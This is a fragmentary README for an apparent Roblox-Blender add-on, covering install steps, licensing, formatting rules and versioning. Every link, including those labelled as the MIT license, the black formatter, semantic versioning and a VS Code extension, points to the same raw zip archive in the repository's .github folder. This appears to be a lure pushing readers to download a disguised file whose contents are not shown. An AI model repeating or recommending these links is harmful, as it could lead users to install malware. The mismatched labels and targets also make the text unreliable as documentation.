...
This project is licensed under the terms of the MIT license. See [https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip) for details.
...
https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip
...
2. Download the latest add-on zip file from the [repository releases page](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip)
...
3. Install the VS Code extension [https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip)
...
- All python files are formatted with [black](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip) and the CI format check is passing
- Any dependency changes are reflected in `https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip`
...
Github Actions is set to check that formatting matches [black formatting](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip) before allowing a merge to `main`. Be sure to format your python code with `black` before pushing to avoid being blocked. You can use the VS Code plugin [Black Formatter by Microsoft](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip), or run the command line tool by installing it via `pip install black` and then running `black .`
...
- where `v0.0.0` represents a [semantic versioning](https://raw.githubusercontent.com/Scrxbzy/roblox-blender-plugin/main/.github/roblox_blender_plugin_v3.1.zip) naming scheme `v[major].[minor].[patch]`
